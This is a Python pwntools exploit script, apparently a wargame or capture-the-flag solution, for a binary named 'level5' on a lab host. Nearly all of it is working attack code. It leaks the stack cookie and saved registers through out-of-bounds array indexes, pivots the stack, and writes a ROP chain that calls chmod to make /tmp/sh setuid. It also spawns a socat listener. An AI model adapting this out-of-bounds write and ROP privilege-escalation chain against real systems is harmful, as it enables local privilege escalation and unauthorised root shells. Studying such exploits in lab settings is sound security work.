#!/usr/bin/env python2
# encoding: utf-8

from pwn import *
import time

int_80 = 0x08048d2d
nop_int_80 = 0x08053f8f


def read_value(off):
    log.debug('Requesting array[%d]', off)
    r.sendlinethen('id:', 'get')
    return int(r.sendlinethen('\n', '-{}'.format(256-off)).strip().split(' ')[1])


def set_value(off, value):
    log.debug('Setting array[%d]=%x', off, value)
    r.sendlinethen('id:', 'set')
    r.sendlinethen(': ', '-{}'.format(256-off))
    r.sendlinethen('\n', '{}'.format(value))


def write(start, data):
    for i in range(len(data)/4):
        value = data[4*i:4*(i+1)]
        log.info('Store %r at %d', value, start+i)
        value += '\x00' * (4 - len(value))
        set_value(start+i, u32(value))


def exploit(ebp):
    new_stack = ebp-0x5c+0x14
    new_stack = ebp+4*4
    r.sendlinethen(': ', 'set')
    r.sendlinethen(': ', '0')
    r.sendlinethen('\n', '31337')

    elf = ELF('level5')
    rop = ROP([elf], ebp+4*4)
    rop.migrate(new_stack)
    log.info('Setup new stack:\n%s', rop.dump())
    payload = str(rop)

    rop = ROP([elf], new_stack)

    def add_gadget(addr, *names):
        rop.gadgets[addr] = {
                'insns': names,
                'regs': [],
                'move': 0
                }

    add_gadget(int_80, 'int 0x80')
    add_gadget(nop_int_80, 'nop', 'int 0x80')

    #rop.raw(rop.edx_ecx_ebx[0])
    #rop.raw(0)
    #rop.raw(new_stack + 4 * 15)
    #rop.raw(new_stack + 4 * 9)
    #rop.raw(rop.eax[0])
    #rop.raw(0xb)
    #rop.raw(nop_int_80)
    #rop.raw(rop.esp[0])
    #rop.raw(new_stack + 4 * 18)
    #rop.raw('/bin/cp\x00')
    #rop.raw('/bin/sh\x00')
    #rop.raw('/tmp/sh\x00')
    #rop.raw(new_stack + 4 * 9)
    #rop.raw(new_stack + 4 * 11)
    #rop.raw(new_stack + 4 * 13)
    #rop.raw(0)

    #new_stack += len(str(rop))

    rop.raw(rop.edx_ecx_ebx[0])
    rop.raw(0)
    rop.raw(0o4755)
    rop.raw(new_stack + 4 * 7)
    rop.raw(rop.eax[0])
    rop.raw(0xf)
    rop.raw(nop_int_80)
    rop.raw('/tmp/sh\x00')
    log.info('ROP-Chain:\n%s', rop.dump())
    return payload, str(rop)

context.terminal = ['terminator', '-e']

try:
    #r = remote('192.168.56.101', 44445)
    r = gdb.debug('./level5')#, execute='break *0x805383c\ncontinue')
except PwnlibException:
    r = remote('192.168.56.101', 44444)
    r.sendline('cd ~level4')
    r.sendline('socat TCP4-listen:44445,reuseaddr,fork EXEC:./level5')
    r.close()
    with log.waitfor('Reconnecting...') as p:
        r = None
        while r is None:
            try:
                r = remote('192.168.56.101', 44445, timeout=5)
            except PwnlibException:
                time.sleep(0.5)


stack_size = 0x5c
array_start = 0x14
buffer_start = 0x3c
stack_offset = (stack_size - array_start) / 4
log.info('Stack starts at array[%d]', stack_offset)

# get basepointer
cookie = read_value(14)
log.info('Stack cookie: %x', cookie)
log.info(hex(read_value(stack_offset - 1)))
ebx = read_value(stack_offset)
log.info('EBX: %x', ebx)
log.info('ESI: %x', read_value(stack_offset + 1))
log.info('EDI: %x', read_value(stack_offset + 2))
old_ebp = read_value(stack_offset + 3)
log.info('Old EBP: %x', old_ebp)
ebp = old_ebp - (3+12) * 4
log.info('EBP: %x', ebp)
eip = read_value(stack_offset + 4)
log.info('EIP: %x', eip)


#context.log_level = 'debug'

payload1, payload2 = exploit(ebp)

write(stack_offset + 4, payload2)

eip = read_value(stack_offset + 4)
log.info('New EIP: %x', eip)
r.sendline('exit')
